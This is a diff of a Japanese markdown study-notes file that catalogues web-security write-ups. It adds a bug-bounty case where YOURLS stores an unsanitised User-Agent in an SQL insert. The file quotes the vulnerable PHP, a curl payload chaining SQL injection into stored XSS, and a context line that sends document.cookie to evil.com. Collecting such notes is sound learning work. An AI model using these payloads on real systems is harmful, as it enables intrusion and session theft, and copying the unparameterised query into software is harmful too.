@@ -940,11 +940,44 @@ CONFIG = {
   foo: window.location=`http:\/\/evil.com\/${document.cookie}` // omitted <!-- for clarity
 }
 ```
-## 
+## Stored XSS in User-Agent Referer / SQL Injection / (Tips for bug bounty beginners from a real life experience)
+https://renaudmarti.net/posts/first-bug-bounty-submission/  
 - **entrypoint**   
-- **概要**   
-- **Payload**   
+以下のようにUser-Agentをサニタイジングほぼ無しでDBに格納しているため、SQLインジェクションの脆弱性がある。  
+```js
+// Log a redirect (for stats)
+function yourls_log_redirect( $keyword ) {
+if ( !yourls_do_log_redirect() )
+return true;
+global $ydb;
+$table = YOURLS_DB_TABLE_LOG;
 
+$keyword = yourls_sanitize_string( $keyword );
+$referrer = ( isset( $_SERVER['HTTP_REFERER'] ) ? yourls_sanitize_url( $_SERVER['HTTP_REFERER'] ) : 'direct' );
+$ua = yourls_get_user_agent();
+$ip = yourls_get_IP();
+$location = yourls_geo_ip_to_countrycode( $ip );
+
+return $ydb->query( "INSERT INTO `$table` VALUES ('', NOW(), '$keyword', '$referrer', '$ua', '$ip', '$location')" );
+}
+```
+```js
+// Returns a sanitized a user agent string. Given what I found on http://www.user-agents.org/ it should be OK.
+function yourls_get_user_agent() {
+if ( !isset( $_SERVER['HTTP_USER_AGENT'] ) )
+return '-';
+
+$ua = strip_tags( html_entity_decode( $_SERVER['HTTP_USER_AGENT'] ));
+$ua = preg_replace('![^0-9a-zA-Z\':., /{}\(\)\[\]\+@&\!\?;_\-=~\*\#]!', '', $ua );
+
+return substr( $ua, 0, 254 );
+}
+```
+また、Refererを統計ページで表示する機能があるため、Stored XSSもできることがわかる。  
+- **Payload**   
+```txt
+curl http://yourls.local/ozh -H "User-Agent: test', '', ''), ('', NOW(), 'ozh', concat(char(60), 'script', char(62), 'alert(document.cookie);', char(60), '/script', char(62)), '', '', '') #"
+```
 ## 
 - **entrypoint**   
 - **概要**   
@@ -956,7 +989,6 @@ https://terjanq.github.io/google-ctf-writeups/
 ムズそう…  
 - **概要**   
 - **Payload**   
-
 ## bypass XSS Auditor (ISITDTU CTF 2019 Quals Writeup - XSSgame1)
 https://graneed.hatenablog.com/entry/2019/06/30/224928   
 - **entrypoint**   
@@ -1338,6 +1370,12 @@ https://graneed.hatenablog.com/entry/2018/11/23/222842
 ### katagaitaiCTF#9 xss千本ノック
 http://sec-rookie.hatenablog.com/entry/2017/08/29/015957   
 https://exploit.moe/2017-08-28/katagaitaiCTF9-writeup   
+
+# メモ
+http://www.thespanner.co.uk/2012/05/08/eval-a-url/  
+`eval(url)`としてurlの形態を保ったままでJSを実行できるらしい  
+https://renaudmarti.net/posts/intigriti-xss-challenge/  
+動作環境ないと理解するの難しそう…  
 
 
 
